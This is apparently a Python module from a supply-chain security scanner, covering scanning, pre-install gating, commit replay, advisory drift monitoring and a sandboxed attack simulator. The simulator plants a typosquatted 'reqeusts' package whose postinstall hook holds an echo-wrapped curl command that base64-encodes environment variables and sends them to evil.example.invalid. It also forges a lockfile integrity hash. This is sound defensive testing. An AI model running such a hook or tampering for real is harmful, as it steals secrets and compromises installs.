"""Continuous monitoring modes: scan engine, pre-install gate, commit replay,
zero-day drift daemon, and the 1-click safe attack simulator.

Deliberate deviations from the original plan (both for safety):
* Commit replay reads historical files with `git show <sha>:<path>` instead of
  checking out `git worktree`s. A checkout can run repo-configured smudge
  filters and post-checkout hooks; reading blobs cannot, and it writes nothing.
* The attack simulator never commits into, or creates branches in, the target
  repository. It copies only package.json + the lockfile into a throwaway
  sandbox directory with an `.npmrc` that disables scripts and points the
  registry at an unroutable address, so even an accidental `npm install` there
  can neither fetch nor execute anything. The sandbox is deleted afterwards.
"""
from __future__ import annotations

import asyncio
import json
import shutil
import tempfile
import threading
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

from models import (
    AdmissionResult,
    AnomalyKind,
    CommitReport,
    DaemonStatus,
    Decision,
    ReplayResult,
    ScanResult,
    SimulationResult,
    StaticAnomaly,
    Vulnerability,
    utcnow,
)
from attack_tree import AttackTree, build_dependency_graph
from orchestrator import LogBus, Orchestrator, ScanContext
from risk_engine import KEV_FLOOR_REACHABLE
import threat_intel
from mitigation_engine import HumanDecisionType, MitigationDecisionPackage, record_human_decision
from remediation_agent import LeadRemediationAgent

BLOCK_SCORE = KEV_FLOOR_REACHABLE   # admission gate blocks at Critical (>= 80) or on any hard-block signal
from scanners import (
    LOCKFILES,
    _sbom_from_lock,
    compare_lock_hashes,
    git,
    git_show,
    inspect_dockerfile,
    inspect_manifest_hooks,
    inspect_workflow,
    is_git_repo,
    lock_hash_index,
    npm_purl,
    read_text,
    is_remote_source,
    repo_cache_dir,
    resolve_repo_source,
    run_cdxgen,
    run_osv_scanner,
    run_pre_cve_admission_check,
    run_static_supply_chain_inspector,
    sha512_integrity,
    validate_repo_path,
)


def parse_pkg_spec(spec: str) -> Tuple[str, Optional[str], str]:
    """'reqeusts@1.0.0' | '@scope/x@1.2.3' | 'pypi:requests==2.0' -> (name, version, ecosystem)."""
    spec = spec.strip()
    ecosystem = "npm"
    if spec.lower().startswith(("pypi:", "pip:")):
        ecosystem, spec = "pypi", spec.split(":", 1)[1]
        name, _, ver = spec.partition("==")
        return name.strip(), (ver.strip() or None), ecosystem
    if spec.startswith("@"):
        scope_rest = spec[1:]
        name, sep, ver = scope_rest.rpartition("@") if scope_rest.count("@") else (scope_rest, "", "")
        return ("@" + name if sep else "@" + scope_rest), (ver or None) if sep else None, ecosystem
    name, _, ver = spec.partition("@")
    return name, ver or None, ecosystem


class Engine:
    """Holds the in-memory SBOM / Attack Tree / orchestrator for one repo."""

    def __init__(self, log: LogBus) -> None:
        self.log = log
        self.ctx: Optional[ScanContext] = None
        self.orch: Optional[Orchestrator] = None
        self.last_result: Optional[ScanResult] = None
        self.lock = threading.RLock()
        self.use_llm = True
        self.daemon = DriftDaemon(self)
        self.sources: Dict[Path, str] = {}   # local path -> GitHub URL it was cloned from
        self.intel_status: Dict[str, Any] = {}
        # STATE["mitigations"][finding_id] and STATE["decision_log"]: mutated in place, shared with the API
        self.state: Dict[str, Any] = {"mitigations": {}, "decision_log": []}
        self._decisions: Dict[str, Dict[str, Any]] = {}     # stable key -> last human decision
        self._decisions_repo: Optional[Path] = None
        self.remediation: Optional[LeadRemediationAgent] = None
        self._rem_thread: Optional[threading.Thread] = None

    # ---- agentic remediation (isolated workspace, human approval boundary) ---- #
    def start_remediation(self, finding_ids: Optional[List[str]] = None, max_iterations: int = 5,
                          run_tests: bool = False, use_llm: bool = True, background: bool = True) -> Dict[str, Any]:
        with self.lock:
            if self._rem_thread and self._rem_thread.is_alive():
                raise ValueError("a remediation session is already running")
            if self.ctx is None or self.orch is None:
                raise ValueError("run a scan first")
            from orchestrator import LLMClient
            llm = None
            if use_llm and self.use_llm:
                llm = LLMClient()
                llm.log = self.log
                if not (llm.enabled and LLMClient.sdk_available(llm.provider)):
                    llm = None
            unknown = [f for f in (finding_ids or []) if f not in self.ctx.tree.findings]
            if unknown:
                raise ValueError(f"unknown finding ids: {unknown}")
            if self.remediation is not None and self.remediation.mem.status != "applied":
                self.remediation.cleanup()
            agent = LeadRemediationAgent(self.ctx, dict(self.state["mitigations"]), self.log, llm=llm,
                                         max_iterations=max_iterations, finding_ids=finding_ids, run_tests=run_tests)
            self.remediation = agent
        if background:
            self._rem_thread = threading.Thread(target=agent.run, name="remediation-agent", daemon=True)
            self._rem_thread.start()
        else:
            agent.run()
        return self.remediation_state()

    def remediation_state(self) -> Dict[str, Any]:
        a = self.remediation
        if a is None:
            return {"session": None}
        running = bool(self._rem_thread and self._rem_thread.is_alive())
        return {"session": a.mem.model_dump(mode="json"), "running": running}

    def stop_remediation(self) -> Dict[str, Any]:
        if self.remediation is not None:
            self.remediation.stop_flag.set()
        return self.remediation_state()

    # ---- human validation gate ---------------------------------------------- #
    def _decision_file(self, repo: Path) -> Path:
        return repo_cache_dir(repo) / "decisions.jsonl"

    def _load_decisions(self, repo: Path) -> None:
        if self._decisions_repo == repo:
            return
        self._decisions, self._decisions_repo = {}, repo
        self.state["decision_log"].clear()
        f = self._decision_file(repo)
        if f.exists():
            for line in f.read_text(encoding="utf-8").splitlines():
                try:
                    entry = json.loads(line)
                except ValueError:
                    continue
                self.state["decision_log"].append(entry)
                self._decisions[entry["stable_key"]] = entry

    def validate_mitigation(self, finding_id: str, decision: Any, reviewer: str, justification: str,
                            chosen_candidate_id: Optional[str] = None) -> MitigationDecisionPackage:
        with self.lock:
            pkg = self.state["mitigations"].get(finding_id)
            if pkg is None:
                raise KeyError(f"no mitigation package for finding {finding_id}")
            updated = record_human_decision(pkg, decision, reviewer, justification, chosen_candidate_id)
            hv = updated.human_validation
            chosen = next((c for c in updated.candidates if c.candidate_id == hv.chosen_candidate_id), None)
            entry = {"ts": hv.decided_at, "finding_id": finding_id, "stable_key": updated.stable_key,
                     "package": f"{updated.package_name}@{updated.current_version}", "risk_score": updated.risk_score,
                     "requires_human_validation": updated.requires_human_validation,
                     "previous_decision": pkg.human_validation.decision.value, "decision": hv.decision.value,
                     "chosen_candidate_id": hv.chosen_candidate_id,
                     "chosen_action": chosen.action_type.value if chosen else None,
                     "chosen_target": chosen.target_version_or_ref if chosen else None,
                     "apply_command": chosen.apply_command if chosen else None,
                     "reviewer": hv.reviewer, "justification": hv.justification, "decided_at": hv.decided_at}
            self.state["mitigations"][finding_id] = updated
            self.state["decision_log"].append(entry)
            self._decisions[updated.stable_key] = entry
            if self.ctx is not None:
                with self._decision_file(self.ctx.repo).open("a", encoding="utf-8") as fh:   # append-only audit trail
                    fh.write(json.dumps(entry) + "\n")
            self.log("human-gate", f"{finding_id} {hv.decision.value} by {hv.reviewer}"
                                   + (f" -> {chosen.candidate_id} ({chosen.target_version_or_ref})" if chosen else ""), "success")
            self.refresh_result()
            return updated

    def resolve(self, source: str, refresh: bool = False) -> Path:
        """Local path or public GitHub URL -> validated local repository path."""
        repo = resolve_repo_source(source, self.log, refresh=refresh)
        if is_remote_source(source):
            self.sources[repo] = source.strip()
        return repo

    # ---- full scan ---------------------------------------------------------- #
    def scan(self, repo_path: str, use_llm: bool = True, resolve_lockfile: bool = False,
             use_cache: bool = True) -> ScanResult:
        with self.lock:
            repo = self.resolve(repo_path, refresh=True)   # a URL is (re-)cloned on every full scan
            self.use_llm = use_llm
            self.log("engine", f"full read-only scan of {self.sources.get(repo, repo)}", "info")
            sbom, imports = run_cdxgen(repo, self.log, use_cache=use_cache, resolve_lockfile=resolve_lockfile)
            vulns, vuln_source = run_osv_scanner(sbom, self.log)
            self.intel_status = threat_intel.enrich(vulns, self.log)
            cache = repo_cache_dir(repo)
            baseline = cache / "baseline_sbom.json"
            ref = "HEAD~1"
            if is_git_repo(repo) and git(repo, "rev-parse", "--verify", "-q", "HEAD~1").returncode != 0:
                ref = "HEAD"
            anomalies = run_static_supply_chain_inspector(repo, baseline if baseline.exists() else None, ref, self.log)
            if not baseline.exists():
                baseline.write_text(sbom.model_dump_json(), encoding="utf-8")
                self.log("engine", "baseline SBOM recorded for future hash-mutation checks", "info")
            return self._build(repo, sbom, imports, vulns, anomalies, vuln_source)

    def _build(self, repo: Path, sbom: Any, imports: Any, vulns: List[Vulnerability],
               anomalies: List[StaticAnomaly], vuln_source: str,
               llm_advisories: Optional[Set[str]] = None) -> ScanResult:
        tree = AttackTree(repo, sbom, imports, vulns, anomalies, self.log).build()
        admissions = self.ctx.admissions if self.ctx and self.ctx.repo == repo else {}
        self.ctx = ScanContext(repo=repo, sbom=sbom, imports=imports, vulns=vulns, anomalies=anomalies,
                               tree=tree, admissions={})
        self.orch = Orchestrator(self.ctx, self.log, use_llm=self.use_llm)
        if llm_advisories is None:
            cards = self.orch.triage()
        else:  # drift: only newly disclosed advisories get the (costly) LLM pass
            cards = []
            for f in tree.findings.values():
                card = self.orch.triage_finding(f, allow_llm=bool(set(f.advisory_ids) & llm_advisories))
                self.ctx.cards[f.id] = card
                cards.append(card)
        for g in tree.fix_groups:          # an agent-verified call site may have raised a finding's score
            fs = [tree.findings[i] for i in g.findings if i in tree.findings]
            if fs:
                worst = max(fs, key=lambda x: x.risk.total)
                g.max_score, g.max_severity = worst.risk.total, worst.risk.severity
        for res in admissions.values():   # keep earlier gate decisions visible in the graph
            self._attach_admission(res)
        self._load_decisions(repo)
        self.state["mitigations"].clear()
        self.state["mitigations"].update(self.orch.build_mitigations(self._decisions))
        notes = list(sbom.notes)
        if repo in self.sources:
            notes.insert(0, f"Scanned a shallow clone of {self.sources[repo]} (hooks, LFS and symlinks disabled).")
        if vuln_source == "demo":
            notes.append("Advisories are built-in DEMO data (scanner and OSV API unavailable).")
        st = self.intel_status
        if vulns and not st.get("kev_checked"):
            notes.append("CISA KEV was not checked (offline or unavailable): KEV is scored as unknown and confidence is lowered.")
        if vulns and not st.get("epss_checked"):
            notes.append("FIRST EPSS was not checked (offline or unavailable): an EPSS prior of 0.01 is used and confidence is lowered.")
        idx = tree.dependency_index()
        self.last_result = ScanResult(
            repo_path=str(repo), sbom_source=sbom.source, vuln_source=vuln_source, kpis=tree.kpis(),
            findings=list(tree.findings.values()), cards=list(self.ctx.cards.values()), anomalies=anomalies,
            graph=tree.to_payload(),
            dependency_graph=build_dependency_graph(sbom, tree.findings.values(), repo.name, idx),
            dependency_stats=idx.stats(), fix_groups=tree.fix_groups, intel=dict(self.intel_status),
            mitigations={k: v.model_dump(mode="json") for k, v in self.state["mitigations"].items()},
            decision_log=list(self.state["decision_log"])[-200:], notes=notes)
        k = self.last_result.kpis
        self.log("engine", f"done: {k.total_components} components | {k.raw_scanner_alerts} raw alerts | "
                           f"{k.actionable_critical} critical | {k.downgraded_noise} downgraded noise", "success")
        return self.last_result

    def ensure_ctx(self, repo_path: str) -> ScanContext:
        repo = self.resolve(repo_path)
        if self.ctx is None or self.ctx.repo != repo:
            self.scan(str(repo), use_llm=self.use_llm)
        assert self.ctx is not None
        return self.ctx

    def refresh_result(self) -> Optional[ScanResult]:
        if self.ctx and self.last_result:
            t = self.ctx.tree
            self.last_result.findings = list(t.findings.values())
            self.last_result.cards = list(self.ctx.cards.values())
            self.last_result.graph = t.to_payload()
            self.last_result.dependency_graph = build_dependency_graph(self.ctx.sbom, t.findings.values(),
                                                                       self.ctx.repo.name, t.dependency_index())
            self.last_result.fix_groups = t.fix_groups
            self.last_result.kpis = t.kpis()
            self.last_result.mitigations = {k: v.model_dump(mode="json") for k, v in self.state["mitigations"].items()}
            self.last_result.decision_log = list(self.state["decision_log"])[-200:]
        return self.last_result

    # ---- pre-install admission gate ----------------------------------------- #
    def _attach_admission(self, res: AdmissionResult) -> AdmissionResult:
        assert self.ctx is not None and self.orch is not None
        self.ctx.admissions[res.purl] = res
        finding = self.ctx.tree.add_admission(res)
        hard = [s for s in res.signals if s.triggered and s.hard_block]
        res.decision = Decision.BLOCKED if hard or finding.risk.total >= BLOCK_SCORE else Decision.APPROVED
        res.card = self.orch.triage_finding(finding, allow_llm=True)
        self.ctx.cards[finding.id] = res.card
        return res

    def check_pkg(self, repo_path: str, spec: str, candidate_meta: Optional[Dict[str, Any]] = None) -> AdmissionResult:
        with self.lock:
            ctx = self.ensure_ctx(repo_path)
            name, version, eco = parse_pkg_spec(spec)
            self.log("pre_cve_gate", f"admission check for {name}@{version or 'latest'} ({eco}) BEFORE install", "info")
            res = run_pre_cve_admission_check(name, version, eco, candidate_meta=candidate_meta, log=self.log)
            existing = [c for c in ctx.sbom.components if c.name == name]
            if existing:
                res.errors.append(f"note: replaces existing {name}@{existing[0].version} in the attack tree")
            res = self._attach_admission(res)
            fid = res.card.finding.finding_id if res.card else None
            if fid and self.orch is not None:
                self.state["mitigations"].update(self.orch.build_mitigations(self._decisions, [fid]))
            level = "error" if res.decision == Decision.BLOCKED else "success"
            self.log("pre_cve_gate", f"{res.decision.value}: {name}@{res.version} (risk {res.card.risk.total if res.card else '?'}/100)", level)
            self.refresh_result()
            return res

    # ---- git-history commit replay ------------------------------------------ #
    def replay(self, repo_path: str, commits: int = 5, check_registry: bool = True) -> ReplayResult:
        with self.lock:
            repo = self.resolve(repo_path)
            out = ReplayResult(repo_path=str(repo))
            if not is_git_repo(repo):
                out.notes.append("not a git repository")
                return out
            ctx = self.ensure_ctx(repo_path)
            revs = git(repo, "rev-list", f"--max-count={commits + 1}", "HEAD").stdout.split()
            revs.reverse()
            if len(revs) < 2:
                out.notes.append("need at least 2 commits (shallow clone too shallow?)")
                return out
            self.log("replay", f"replaying {len(revs) - 1} commit(s) read-only via git show (no checkout)", "info")
            for prev, cur in zip(revs, revs[1:]):
                subject = git(repo, "log", "-1", "--format=%s", cur).stdout.strip()
                rep = CommitReport(sha=cur[:12], subject=subject[:120])
                changed = git(repo, "diff", "--no-ext-diff", "--no-textconv", "--name-only", prev, cur).stdout.split("\n")
                relevant = [p for p in changed if p and (p in ("package.json", *LOCKFILES) or Path(p).name.startswith("Dockerfile")
                                                        or p.startswith(".github/workflows/"))]
                for rel in relevant:
                    old, new = git_show(repo, prev, rel) or "", git_show(repo, cur, rel)
                    if new is None:
                        rep.removed.append(rel)
                        continue
                    if rel == "package.json":
                        self._diff_manifest(old, new, rep)
                        old_hooks = {a.snippet for a in inspect_manifest_hooks(old)} if old else set()
                        rep.anomalies += [a for a in inspect_manifest_hooks(new) if a.snippet not in old_hooks]
                    elif rel in LOCKFILES and old:
                        try:
                            rep.anomalies += compare_lock_hashes(rel, new, lock_hash_index(rel, old), f"commit {prev[:8]}")
                        except ValueError:
                            pass
                    elif Path(rel).name.startswith("Dockerfile"):
                        rep.anomalies += [a for a in inspect_dockerfile(new, rel) if a.snippet not in old]
                    else:
                        rep.anomalies += [a for a in inspect_workflow(new, rel) if a.snippet not in old]
                if rep.added or rep.changed:
                    rep.triaged = True
                    for spec in (rep.added + rep.changed)[:5]:
                        name, ver = spec.rsplit("@", 1) if spec.count("@") > (1 if spec.startswith("@") else 0) else (spec, None)
                        ver = (ver or "").lstrip("^~>=< ") or None
                        try:
                            res = run_pre_cve_admission_check(name, ver, "npm", log=self.log) if check_registry else \
                                run_pre_cve_admission_check(name, ver, "npm", candidate_meta={"exists": True}, log=self.log)
                            rep.admissions.append(self._attach_admission(res))
                        except ValueError as exc:
                            self.log("replay", f"skip {spec}: {exc}", "warn")
                if rep.anomalies:
                    rep.triaged = True
                msg = (f"{cur[:8]} {subject[:60]!r}: +{len(rep.added)} -{len(rep.removed)} ~{len(rep.changed)} deps, "
                       f"{len(rep.anomalies)} new static observation(s)")
                self.log("replay", msg + ("" if rep.triaged else " - no supply-chain change, orchestrator skipped"),
                         "warn" if rep.anomalies or any(a.decision == Decision.BLOCKED for a in rep.admissions) else "info")
                out.commits.append(rep)
            self.refresh_result()
            return out

    @staticmethod
    def _diff_manifest(old_text: str, new_text: str, rep: CommitReport) -> None:
        try:
            old = json.loads(old_text) if old_text else {}
            new = json.loads(new_text)
        except ValueError:
            return
        def deps(d: Dict[str, Any]) -> Dict[str, str]:
            out: Dict[str, str] = {}
            for k in ("dependencies", "optionalDependencies", "devDependencies"):
                out.update(d.get(k, {}) or {})
            return out
        a, b = deps(old), deps(new)
        rep.added += [f"{k}@{v}" for k, v in b.items() if k not in a]
        rep.removed += [f"{k}@{v}" for k, v in a.items() if k not in b]
        rep.changed += [f"{k}@{b[k]}" for k in b if k in a and a[k] != b[k]]

    # ---- 1-click safe attack simulation ------------------------------------- #
    SAFE_PAYLOAD = "echo '[SAFE_TEST] curl http://evil.example.invalid/steal?env=$(env | base64)'"

    def simulate_attack(self, repo_path: str, keep_sandbox: bool = False) -> SimulationResult:
        with self.lock:
            ctx = self.ensure_ctx(repo_path)
            repo = ctx.repo
            sandbox = Path(tempfile.mkdtemp(prefix="scg-sim-"))
            self.log("simulator", f"sandbox {sandbox} (target repo is never modified)", "info")
            notes = [
                "Only package.json and the lockfile were copied into a temp sandbox; the target repo was not modified.",
                "Sandbox .npmrc sets ignore-scripts=true, offline=true and an unroutable registry (127.0.0.1:9).",
                "The postinstall payload exists only as text in a mock tarball; nothing was installed or executed.",
                "evil.example.invalid uses the reserved .invalid TLD and can never resolve.",
            ]
            try:
                (sandbox / ".npmrc").write_text("ignore-scripts=true\noffline=true\naudit=false\nfund=false\n"
                                                "registry=http://127.0.0.1:9/\n", encoding="utf-8")
                (sandbox / "SCG_SIMULATION_README.txt").write_text(
                    "Supply-Chain Guardian safe attack simulation sandbox. Inert test data. Do not install.\n", encoding="utf-8")
                manifest = json.loads(read_text(repo / "package.json") or '{"name":"demo","dependencies":{}}')
                baseline_lock = self._baseline_lock(repo, ctx)
                lock = json.loads(baseline_lock)

                # Attack 1: typosquatted dependency with an exfiltration-shaped postinstall hook
                manifest.setdefault("dependencies", {})["reqeusts"] = "1.0.0"
                lock["packages"][""].setdefault("dependencies", {})["reqeusts"] = "1.0.0"
                lock["packages"]["node_modules/reqeusts"] = {
                    "version": "1.0.0", "resolved": "http://127.0.0.1:9/reqeusts/-/reqeusts-1.0.0.tgz",
                    "integrity": sha512_integrity(b"SCG_SAFE_TEST reqeusts-1.0.0"), "hasInstallScript": True}
                mock_pkg = {"name": "reqeusts", "version": "1.0.0", "description": "[SAFE_TEST] inert fixture",
                            "scripts": {"postinstall": self.SAFE_PAYLOAD}}
                mock_dir = sandbox / "mock-registry" / "reqeusts-1.0.0" / "package"
                mock_dir.mkdir(parents=True)
                mock_text = json.dumps(mock_pkg, indent=2)
                (mock_dir / "package.json").write_text(mock_text, encoding="utf-8")
                (mock_dir / "index.js").write_text("module.exports = {} // [SAFE_TEST] inert\n", encoding="utf-8")

                # Attack 2: integrity tamper on an existing package without a version bump
                victim_key = next((k for k in ("node_modules/express", "node_modules/jsonwebtoken")
                                   if k in lock["packages"]), next(k for k in lock["packages"] if k))
                victim = lock["packages"][victim_key]
                victim["integrity"] = sha512_integrity(b"SCG_SAFE_TEST tampered " + victim_key.encode())
                victim_name = victim_key.rsplit("node_modules/", 1)[-1]

                (sandbox / "package.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
                mutated_lock = json.dumps(lock, indent=2)
                (sandbox / "package-lock.json").write_text(mutated_lock, encoding="utf-8")
                injected = [f'package.json: "reqeusts": "1.0.0" (postinstall: {self.SAFE_PAYLOAD})',
                            f"package-lock.json: {victim_name}@{victim.get('version')} integrity rewritten, version unchanged"]
                for i in injected:
                    self.log("simulator", f"injected {i}", "warn")

                # Feed the "commit" to the pipeline
                anomalies = compare_lock_hashes("package-lock.json", mutated_lock,
                                                lock_hash_index("package-lock.json", baseline_lock), "pre-attack lockfile",
                                                id_prefix="SIM-LOCK")
                sim_sbom = _sbom_from_lock(sandbox, sandbox / "package-lock.json", "package-lock.json", manifest,
                                           json.dumps(manifest, indent=2), [])
                sim_tree = AttackTree(sandbox, sim_sbom, [], [], anomalies, self.log).build()
                sim_ctx = ScanContext(repo=sandbox, sbom=sim_sbom, imports=[], vulns=[], anomalies=anomalies, tree=sim_tree)
                sim_orch = Orchestrator(sim_ctx, self.log, use_llm=self.use_llm)
                cards = sim_orch.triage()

                hook_line = next(i for i, ln in enumerate(mock_text.splitlines(), 1) if '"postinstall"' in ln)
                now = datetime.now(timezone.utc)
                meta = {"exists": True, "name": "reqeusts", "version": "1.0.0",
                        "scripts": {"postinstall": self.SAFE_PAYLOAD}, "script_lines": {"postinstall": hook_line},
                        "prev_version": None, "prev_scripts": {},
                        "published": (now - timedelta(days=1)).isoformat(), "last_publish": (now - timedelta(days=1)).isoformat(),
                        "attestations": False, "weekly_downloads": None,
                        "files": {"package/index.js": "module.exports = {}"},
                        # sandbox-relative, so the validator can verify the hook line on disk
                        "source_label": "mock-registry/reqeusts-1.0.0/package"}
                adm = run_pre_cve_admission_check("reqeusts", "1.0.0", "npm", candidate_meta=meta, log=self.log)
                sim_ctx.admissions[adm.purl] = adm
                finding = sim_tree.add_admission(adm)
                hard = [s for s in adm.signals if s.triggered and s.hard_block]
                adm.decision = Decision.BLOCKED if hard or finding.risk.total >= BLOCK_SCORE else Decision.APPROVED
                adm.card = sim_orch.triage_finding(finding, allow_llm=True)
                cards.append(adm.card)
                max_score = max(c.risk.total for c in cards)
                blocked = adm.decision == Decision.BLOCKED and all(c.risk.total >= BLOCK_SCORE for c in cards)
                self.log("simulator", f"{'INTERCEPTED & BLOCKED' if blocked else 'NOT FULLY BLOCKED'}: "
                                      f"{len(cards)} card(s), max risk {max_score}/100", "success" if blocked else "error")
                return SimulationResult(sandbox_dir=str(sandbox), sandbox_removed=not keep_sandbox, injected=injected,
                                        admission=adm, anomalies=anomalies, cards=cards, blocked=blocked,
                                        max_score=max_score, graph=sim_tree.to_payload(), safety_notes=notes)
            finally:
                if not keep_sandbox:
                    shutil.rmtree(sandbox, ignore_errors=True)

    @staticmethod
    def _baseline_lock(repo: Path, ctx: ScanContext) -> str:
        for lf in ("package-lock.json", "npm-shrinkwrap.json"):
            text = read_text(repo / lf, 60_000_000)
            if text:
                return text
        resolved = repo_cache_dir(repo) / "resolved-package-lock.json"
        text = read_text(resolved, 60_000_000)
        if text:
            return text
        # No lockfile at all (e.g. Juice Shop): synthesize one from the SBOM so the
        # tamper check has a baseline. Integrity values are synthetic placeholders.
        pkgs: Dict[str, Any] = {"": {"name": "synthetic-baseline", "dependencies": {}}}
        for c in ctx.sbom.components:
            if c.ecosystem != "npm":
                continue
            key = f"node_modules/{c.name}"
            if key in pkgs:
                continue
            pkgs[key] = {"version": c.version, "integrity": c.hashes[0] if c.hashes else
                         sha512_integrity(f"synthetic {c.name}@{c.version}".encode())}
            if c.is_direct:
                pkgs[""]["dependencies"][c.name] = c.version
        return json.dumps({"name": "synthetic-baseline", "lockfileVersion": 3, "packages": pkgs}, indent=2)


class DriftDaemon:
    """Keeps SBOM + import index in memory and re-polls advisories periodically."""

    def __init__(self, engine: Engine) -> None:
        self.engine = engine
        self.status = DaemonStatus(running=False, interval_seconds=30)
        self._task: Optional[asyncio.Task] = None
        self._repo: Optional[str] = None
        self._demo_drift = False

    def start(self, repo_path: str, interval: int = 30, demo_drift: bool = False) -> DaemonStatus:
        if self._task and not self._task.done():
            return self.status
        self._repo, self._demo_drift = repo_path, demo_drift
        self.status = DaemonStatus(running=True, interval_seconds=interval)
        self._task = asyncio.get_running_loop().create_task(self._loop())
        self.engine.log("drift-daemon", f"started (interval {interval}s{', demo drift ON' if demo_drift else ''})", "success")
        return self.status

    def stop(self) -> DaemonStatus:
        if self._task:
            self._task.cancel()
        self.status.running = False
        self.engine.log("drift-daemon", "stopped", "info")
        return self.status

    async def _loop(self, max_polls: Optional[int] = None) -> None:
        try:
            while max_polls is None or self.status.polls < max_polls:
                try:
                    await asyncio.to_thread(self.poll_once)
                except Exception as exc:  # noqa: BLE001 - daemon must survive transient failures
                    self.status.last_error = str(exc)[:300]
                    self.engine.log("drift-daemon", f"poll failed: {exc}", "error")
                if max_polls is not None and self.status.polls >= max_polls:
                    break
                await asyncio.sleep(self.status.interval_seconds)
        except asyncio.CancelledError:
            pass
        finally:
            self.status.running = False

    async def run_foreground(self, repo_path: str, interval: int, max_polls: Optional[int], demo_drift: bool) -> None:
        self._repo, self._demo_drift = repo_path, demo_drift
        self.status = DaemonStatus(running=True, interval_seconds=interval)
        await self._loop(max_polls)

    def poll_once(self) -> DaemonStatus:
        eng = self.engine
        with eng.lock:
            ctx = eng.ensure_ctx(self._repo or ".")
            known = {(v.id, v.purl) for v in ctx.vulns}
            if self.status.polls == 0:
                self.status.known_advisories = len(known)
            eng.log("drift-daemon", f"poll #{self.status.polls + 1}: re-querying advisories for "
                                    f"{len(ctx.sbom.components)} in-memory components (no source re-parse)", "tool")
            fresh, source = run_osv_scanner(ctx.sbom, eng.log)  # advisory lists are never cached; only record details are
            if self._demo_drift and self.status.polls == 1:
                fresh = fresh + [self._synthetic_advisory(ctx)]
            new = [v for v in fresh if (v.id, v.purl) not in known]
            if new:
                threat_intel.enrich(new, eng.log)
            # Exploitation drift: an already-known advisory that has since been added to KEV
            # (or whose EPSS jumped) changes priority even though no new advisory appeared.
            before = {(v.id, v.purl): (v.kev, v.epss) for v in ctx.vulns}
            threat_intel.enrich(ctx.vulns, eng.log)
            escalated = sorted({v.id for v in ctx.vulns if (v.kev and not before[(v.id, v.purl)][0]) or
                                (v.epss is not None and (before[(v.id, v.purl)][1] or 0) < 0.1 <= v.epss)})
            self.status.polls += 1
            self.status.last_poll = utcnow()
            if new or escalated:
                ids = sorted({v.id for v in new})
                self.status.new_advisories = (self.status.new_advisories + ids + escalated)[-50:]
                if ids:
                    eng.log("drift-daemon", f"ZERO-DAY DRIFT: {len(new)} newly disclosed advisory(ies): {', '.join(ids[:5])}", "warn")
                if escalated:
                    eng.log("drift-daemon", f"EXPLOITATION DRIFT: now in CISA KEV or EPSS >= 0.1: {', '.join(escalated[:5])}", "warn")
                eng._build(ctx.repo, ctx.sbom, ctx.imports, ctx.vulns + new, ctx.anomalies, source,
                           llm_advisories=set(ids) | set(escalated))
            else:
                eng.log("drift-daemon", "no new advisories", "info")
            self.status.known_advisories = len(known) + len(new)
            return self.status

    @staticmethod
    def _synthetic_advisory(ctx: ScanContext) -> Vulnerability:
        imported = {s.package for s in ctx.imports if s.package}
        comp = next((c for c in ctx.sbom.components if c.is_direct and c.name in imported and c.name == "express"),
                    next((c for c in ctx.sbom.components if c.is_direct and c.name in imported), ctx.sbom.components[0]))
        return Vulnerability(id="SCG-DRIFT-DEMO-0001", aliases=["DEMO-NOT-A-REAL-ADVISORY"], package=comp.name,
                             version=comp.version, purl=comp.purl, cvss_score=8.1, source="drift-demo",
                             summary="[DEMO] synthetic advisory injected by --demo-drift to exercise drift triage",
                             patched_versions=[], references=[])
